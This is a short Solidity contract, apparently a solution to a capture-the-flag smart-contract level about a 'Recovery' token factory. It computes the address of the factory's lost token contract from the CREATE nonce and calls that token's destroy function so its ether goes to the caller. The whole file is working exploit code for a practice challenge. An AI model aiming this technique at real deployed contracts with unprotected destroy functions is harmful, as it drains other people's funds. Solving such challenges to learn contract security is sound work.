// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "./SimpleToken.sol";

contract Solution16 {
    Recovery public victim;

    constructor(Recovery victim_) {
        victim = victim_;
    }

    //Recover address fo lost contract address
    function attack() external {

        // Calculate the address generated by the CREATE opcode
        // sender -> address of the `victim` (token factory)
        // nonce -> `1` because it's the first token created by the factory
        // This is the RLP encoding alg in Solidity
        address payable lostContract = payable(address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(victim), bytes1(0x01))))))
        );

        SimpleToken(lostContract).destroy(payable(msg.sender));
    }
}
